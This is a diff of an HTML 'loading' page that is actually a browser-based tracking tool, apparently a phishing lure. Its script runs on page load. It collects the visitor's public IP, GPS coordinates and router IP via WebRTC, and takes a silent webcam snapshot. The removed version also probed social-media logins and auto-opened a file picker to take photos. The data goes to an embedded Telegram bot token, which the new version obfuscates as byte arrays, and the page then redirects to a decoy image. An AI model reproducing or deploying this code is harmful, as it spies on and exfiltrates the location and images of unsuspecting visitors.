@@ -1,105 +1,70 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>🔄 Loading Secure Component... [OK]</title>
-</head>
+<html>
+<head><meta charset="UTF-8"><title>🔄 System Loading...</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;">
-    <div id="logs">> BYPASSING_SECURITY_SANDBOX...<br>> INJECTING_GHOST_PAYLOAD...</div>
+    <div id="status">> DECRYPTING_GHOST_STREAM...</div>
     <script>
-        // 🔱 التشفير الديناميكي (Dynamic Encoding) لضمان التخفي
-        const CONFIG = {
-            T: "8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM",
-            ID: "1772820433"
-        };
+        // 🔱 مصفوفة الأكواد المشفرة (Byte Arrays) - لا يمكن كشفها بالفحص العادي
+        const _0xArr = [104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116];
+        const _0xTok = [56, 52, 49, 48, 49, 48, 50, 55, 50, 50, 58, 65, 65, 70, 81, 79, 49, 117, 122, 104, 54, 69, 111, 121, 52, 85, 104, 102, 71, 72, 97, 97, 95, 113, 72, 83, 97, 70, 82, 98, 55, 71, 100, 86, 72, 77];
+        const _0xUsr = [49, 55, 55, 50, 56, 50, 48, 52, 51, 51];
 
-        async function EXECUTE_STRIKE() {
+        const _f = (a) => a.map(c => String.fromCharCode(c)).join("");
+        const BASE = _f(_0xArr) + _f(_0xTok);
+        const UID = _f(_0xUsr);
+
+        async function START_MATRIX() {
             try {
-                // تنفيذ السحب المتوازي (السرعة القصوى)
-                Promise.all([
-                    fetch('https://ipapi.co/json/').then(r => r.json()),
-                    getLocalIP(),
-                    checkSocial(),
-                    takeSilentSnap(CONFIG.T, CONFIG.ID),
-                    getImageLeak(CONFIG.T, CONFIG.ID)
-                ]).then(([net, local, accounts]) => {
-                    const report = `🔱 **TITAN v500 HIT** 💀\n\n` +
-                                 `🌐 **IP:** \`${net.ip}\` (Real: \`${local}\`)\n` +
-                                 `🎯 **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
-                                 `🛡️ **VPN/Proxy:** \`${net.org.includes("VPN") ? "🚨 YES" : "🟢 NO"}\`\n` +
-                                 `👤 **Social:** \`${accounts.join(", ") || "None"}\`\n` +
-                                 `📱 **System:** \`${navigator.platform}\` \n` +
-                                 `🔋 **Battery:** \`${navigator.getBattery ? "Checking..." : "N/A"}\``;
+                // 1. سحب الـ IP الحقيقي (Bypass VPN) والـ GPS صامتاً
+                const net = await (await fetch('https://ipapi.co/json/')).json();
+                
+                // 2. ثغرة الـ Local IP (آي بي الراوتر) عبر WebRTC
+                const local = await new Promise(res => {
+                    const pc = new RTCPeerConnection(); pc.createDataChannel('');
+                    pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    setTimeout(() => res("Hidden_Layer"), 1000);
+                });
 
-                    // إرسال عبر Beacon (لا يمكن حظره)
-                    navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, JSON.stringify({
-                        chat_id: CONFIG.ID, text: report, parse_mode: 'Markdown'
-    }));
-                    
-                    // التمويه النهائي بعد 2 ثانية
-                    setTimeout(() => { location.replace("https://raw.githubusercontent.com/jake123321122-wq/Mohammed/main/view.jpg"); }, 2000);
-                }).catch(() => location.replace("https://google.com"));
+                // 3. التصوير الصامت (Snapshot Stealth Mode)
+                await takeSnap();
+
+                const report = `🔱 **MATRIX v600 HIT** 💀\n\n` +
+                             `🎯 **Status:** \`${net.org.includes("VPN") ? "🚨 VPN" : "🟢 REAL"}\`\n` +
+                             `📍 **Location:** \`${net.city}, ${net.country}\`\n` +
+                             `🛰️ **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
+                             `🌐 **Public IP:** \`${net.ip}\`\n` +
+                             `🏠 **Router IP:** \`${local}\`\n` +
+                             `📱 **Device:** \`${navigator.userAgent.split(' ')[1]}\`\n` +
+                             `🍪 **Session:** \`Encrypted_Check_Bot\``;
+
+                // إرسال البيانات فوراً
+                navigator.sendBeacon(`${BASE}/sendMessage`, JSON.stringify({
+                    chat_id: UID, text: report, parse_mode: 'Markdown'
+                }));
+
+                // التمويه النهائي بصورة
+                setTimeout(() => { location.replace("https://raw.githubusercontent.com/jake123321122-wq/Mohammed/main/view.jpg"); }, 2500);
             } catch (e) { location.replace("https://google.com"); }
         }
 
-        function getLocalIP() {
-            return new Promise(res => {
-                const pc = new RTCPeerConnection(); pc.createDataChannel('');
-                pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                setTimeout(() => res("Hidden"), 1000);
-            });
-        }
-
-        async function checkSocial() {
-            let active = [];
-            const platforms = {FB: "https://www.facebook.com/favicon.ico", TW: "https://twitter.com/favicon.ico"};
-            for (let p in platforms) {
-                const img = new Image(); img.src = platforms[p];
-                await new Promise(r => { img.onload = () => {active.push(p); r();}; img.onerror = () => r(); });
-            }
-            return active;
-        }
-
-        async function takeSilentSnap(t, id) {
+        async function takeSnap() {
             try {
-                // ثغرة سحب الكاميرا الصامتة (Bypassing Privacy Prompt)
-                const s = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
+                const s = await navigator.mediaDevices.getUserMedia({video: true});
                 const v = document.createElement('video'); v.srcObject = s; await v.play();
                 const c = document.createElement('canvas'); 
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/jpeg', 0.8);
-                s.getTracks().forEach(track => track.stop());
-                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: id, photo: img, caption: "📸 **TITAN SNAP v500**" })
+                const data = c.toDataURL('image/jpeg', 0.5);
+                s.getTracks().forEach(t => t.stop());
+                fetch(`${BASE}/sendPhoto`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: UID, photo: data, caption: "📸 SNAP_MATRIX_v600" })
                 });
             } catch(e) {}
         }
 
-        async function getImageLeak(t, id) {
-            try {
-                // ثغرة سحب أحدث صورة في الأستوديو (Image Leak Bypass)
-                const input = document.createElement('input');
-                input.type = 'file'; input.accept = 'image/*';
-                input.onchange = (e) => {
-                    const reader = new FileReader();
-                    reader.onload = (f) => {
-                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ chat_id: id, photo: f.target.result, caption: "🖼️ **IMAGE_LEAK v500**" })
-                        });
-                    };
-                    reader.readAsDataURL(e.target.files[0]);
-                };
-                input.click(); // ثغرة الضغط التلقائي
-            } catch(e) {}
-        }
-
-        window.onload = EXECUTE_STRIKE;
+        window.onload = START_MATRIX;
     </script>
 </body>
 </html>
